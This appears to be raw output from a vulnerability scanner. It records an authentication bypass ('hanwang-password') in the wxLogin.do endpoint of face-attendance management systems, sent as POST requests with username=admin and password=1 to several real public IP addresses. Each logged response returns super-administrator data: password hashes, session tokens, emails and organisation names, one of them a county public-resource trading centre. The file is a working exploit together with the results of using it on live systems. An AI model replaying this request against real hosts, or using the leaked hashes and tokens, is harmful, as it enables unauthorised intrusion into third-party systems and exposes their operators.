+
+================  请求响应包 ================
+HTTP/1.1 200 
+Connection: close
+Transfer-Encoding: chunked
+Content-Type: text/html;charset=UTF-8
+Date: Thu, 26 Mar 2026 07:33:20 GMT
+Server: nginx
+Set-Cookie: JSESSIONID=9ACA110CDCDBF509CE813D4E04846BCF; Path=/; HttpOnly
+Vary: accept-encoding
+X-Frame-0ptions: DENY
+
+{"code":0,"result":{"recordTcpPort":9910,"id":1,"userName":"admin","employId":"admin","name":"超级管理员","email":"admin@hanwang.com.cn","password":"c2106dc9520c4edf378fd09732d2f87a1940062b","gender":1,"telephone":"","mobile":"","state":9,"entryDate":"2012-01-01 00:00:00","startWorkDate":"2012-01-01 00:00:00","judgeId":0,"leader":false,"approver":false,"userBranch":{"id":1,"userId":1,"userName":"admin","branchId":1,"branchName":"泗洪县公共资源交易中心","branchSetId":"000","branchCode":"000","postId":1,"postName":"普通员工","syncSign":0,"primary":true,"postType":"","order":0,"branchLevel":9,"leader":false},"cameraFeatureCount":0,"littleFaceCount":0,"workFactor":0,"hasLevelAuthority":false,"branchId":1,"branchName":"泗洪县公共资源交易中心","branchPath":",2,1,","postId":1,"postName":"普通员工","willSync":false,"mobiAttPerm":0,"mobiState":-1,"checkMsg":1,"checkPerm":1,"workonMsg":1,"workonPerm":1,"workendMsg":1,"workendPerm":1,"token":"989F1653176547351F56394487BA98F41D8CB18D","type":1,"changPic":0,"carNumberFlag":false,"updatePersonnelFlag":false,"palmPrintFeatureCount":0,"fingerFeatureCount":0,"districtIds":[],"holidaySearch":true,"openid":"1","blacklist":false},"success":true}
+============================================
+[vuln] [high] [hanwang-password] http://114.251.88.100:8100/manage/m/wxLogin.do?openid=1&username=admin&password=1&id=1&flag=1
+================  请求数据包 ================
+POST /manage/m/wxLogin.do?openid=1&username=admin&password=1&id=1&flag=1 HTTP/1.1
+Host: 114.251.88.100:8100
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0
+Connection: close
+Content-Length: 0
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip
+
+
+================  请求响应包 ================
+HTTP/1.1 200 
+Connection: close
+Transfer-Encoding: chunked
+Content-Type: text/html;charset=UTF-8
+Date: Thu, 26 Mar 2026 07:33:13 GMT
+Server: nginx/1.12.2
+Set-Cookie: JSESSIONID=52091A1C6CA0EC0D56F20A6DA540432C; Path=/; HttpOnly
+Vary: accept-encoding
+
+{"code":0,"result":{"recordTcpPort":9910,"id":1,"userName":"admin","employId":"admin","name":"超级管理员","email":"admin@hanwang.com.cn","password":"c2106dc9520c4edf378fd09732d2f87a1940062b","gender":1,"telephone":"","mobile":"","state":9,"entryDate":"2012-01-01 00:00:00","startWorkDate":"2012-01-01 00:00:00","judgeId":0,"leader":false,"approver":false,"userBranch":{"id":1,"userId":1,"userName":"admin","branchId":1,"branchName":"伊藤中国","branchSetId":"999","branchCode":"999","postId":1,"postName":"普通员工","syncSign":0,"primary":true,"postType":"","order":0,"branchLevel":9,"leader":false},"cameraFeatureCount":0,"littleFaceCount":0,"workFactor":0,"hasLevelAuthority":false,"branchId":1,"branchName":"伊藤中国","postId":1,"postName":"普通员工","willSync":false,"mobiAttPerm":0,"mobiState":-1,"checkMsg":1,"checkPerm":1,"workonMsg":1,"workonPerm":1,"workendMsg":1,"workendPerm":1,"token":"4AAB9ED08E3C1DFADC052EF70E4E3CC76F0C666F","type":1,"openid":"1","blacklist":false},"success":true}
+============================================
+[vuln] [high] [hanwang-password] http://123.188.254.215:8399/manage/m/wxLogin.do?openid=1&username=admin&password=1&id=1&flag=1
+================  请求数据包 ================
+POST /manage/m/wxLogin.do?openid=1&username=admin&password=1&id=1&flag=1 HTTP/1.1
+Host: 123.188.254.215:8399
+User-Agent: Mozilla/5.0 (SS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Content-Length: 0
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip
+
+
+================  请求响应包 ================
+HTTP/1.1 200 
+Connection: close
+Transfer-Encoding: chunked
+Content-Type: text/html;charset=UTF-8
+Date: Thu, 26 Mar 2026 07:33:20 GMT
+Server: nginx/1.21.0
+Set-Cookie: JSESSIONID=4DC2DAE55E6307D54D3C2FB5E3760600; Path=/; HttpOnly
+Vary: accept-encoding
+
+{"code":0,"result":{"recordTcpPort":9910,"id":1,"userName":"admin","employId":"admin","name":"超级管理员","email":"admin@hanwang.com.cn","password":"c5ff9c804e273cf61bb7338d7f38eeac7f26aec7","gender":1,"telephone":"","mobile":"","state":9,"entryDate":"2012-01-01 00:00:00","startWorkDate":"2012-01-01 00:00:00","judgeId":0,"leader":false,"approver":true,"userBranch":{"id":1,"userId":1,"userName":"admin","branchId":1,"branchName":"总校区","branchSetId":"000","branchCode":"000","postId":1,"postName":"教职工","syncSign":0,"primary":true,"postType":"","order":0,"branchLevel":9,"leader":false},"cameraFeatureCount":0,"littleFaceCount":0,"workFactor":0,"hasLevelAuthority":false,"branchId":1,"branchName":"总校区","branchPath":",2,1,","postId":1,"postName":"教职工","willSync":false,"mobiAttPerm":0,"mobiState":-1,"checkMsg":1,"checkPerm":1,"workonMsg":1,"workonPerm":1,"workendMsg":1,"workendPerm":1,"token":"508987E80F582DCC3464AB26041345C62D92148B","type":1,"effectiveDate":"2050-01-01 00:00:00","changPic":0,"carNumberFlag":false,"updatePersonnelFlag":false,"palmPrintFeatureCount":0,"fingerFeatureCount":0,"districtIds":[],"openid":"1","blacklist":false},"success":true}
+============================================
+[vuln] [high] [hanwang-password] http://47.120.3.188:8100/manage/m/wxLogin.do?openid=1&username=admin&password=1&id=1&flag=1
+================  请求数据包 ================
+POST /manage/m/wxLogin.do?openid=1&username=admin&password=1&id=1&flag=1 HTTP/1.1
+Host: 47.120.3.188:8100
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Safari/605.1.15
+Connection: close
+Content-Length: 0
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip
+
+
+================  请求响应包 ================
+HTTP/1.1 200 
+Connection: close
+Transfer-Encoding: chunked
+Content-Type: text/html;charset=UTF-8
+Date: Thu, 26 Mar 2026 07:33:20 GMT
+Server: nginx/1.21.0
+Set-Cookie: JSESSIONID=E9BF9DF0DE54E7F31D70E84445752AC7; Path=/; HttpOnly
+Vary: accept-encoding
+
+{"code":0,"result":{"recordTcpPort":9910,"id":1,"userName":"admin","employId":"admin","name":"超级管理员","email":"admin@hanwang.com.cn","password":"a58dab2783747e00a214cf0929638ead2612be11","gender":1,"telephone":"","mobile":"","state":9,"entryDate":"2012-01-01 00:00:00","startWorkDate":"2012-01-01 00:00:00","judgeId":0,"leader":false,"approver":false,"userBranch":{"id":1,"userId":1,"userName":"admin","branchId":1,"branchName":"人脸考勤云","branchSetId":"0","branchCode":"0","postId":1,"postName":"普通员工","syncSign":0,"primary":true,"postType":"","order":0,"branchLevel":9,"leader":false},"cameraFeatureCount":0,"littleFaceCount":0,"workFactor":0,"hasLevelAuthority":false,"branchId":1,"branchName":"人脸考勤云","branchPath":",2,1,","postId":1,"postName":"普通员工","willSync":false,"mobiAttPerm":0,"mobiState":-1,"checkMsg":1,"checkPerm":1,"workonMsg":1,"workonPerm":1,"workendMsg":1,"workendPerm":1,"token":"03A19FCE5B689339A8C2D93E957EF567345835D3","type":1,"changPic":0,"carNumberFlag":false,"updatePersonnelFlag":false,"palmPrintFeatureCount":0,"fingerFeatureCount":0,"districtIds":[],"holidaySearch":true,"openid":"1","blacklist":false},"success":true}
+============================================
